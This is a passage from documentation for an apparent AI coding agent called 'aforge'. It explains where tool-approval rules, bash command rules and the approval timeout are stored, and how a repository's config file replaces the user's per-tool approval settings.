`"<key>" cannot be changed here`. A row your environment has pinned refuses here
exactly as it does in the settings sheet.

Dropping a line changes what you carry everywhere, and changes nothing inside a
repository that answers `tools.approval` itself.

## Where the rules are stored on disk

Your own answers live in `config.json` in your profile directory —
`$AFORGE_PROFILE_DIR` when it is set, otherwise aforge's state root
`$AFORGE_HOME`, otherwise `~/.aforge`.

The rows that matter here are:

- `tools.approvalMode` — the blanket mode.
- `tools.approval` — per-tool exceptions, where a tool "always" is written.
- `tools.bashPatterns` — ordered shell command rules, where a bash "always" is
  written.
- `approval.timeout_seconds` — the countdown.

A repository can answer `tools.approval` in `.aforge-v3/config.json` in the
directory you opened. When it does, **its row replaces yours wholesale** — it
does not merge. Nothing in the consent card or `/permissions` ever writes to a
repository's file; both write to your profile only.

Session memos — "stop asking me about this tool for now" — are held in memory
and written nowhere at all.
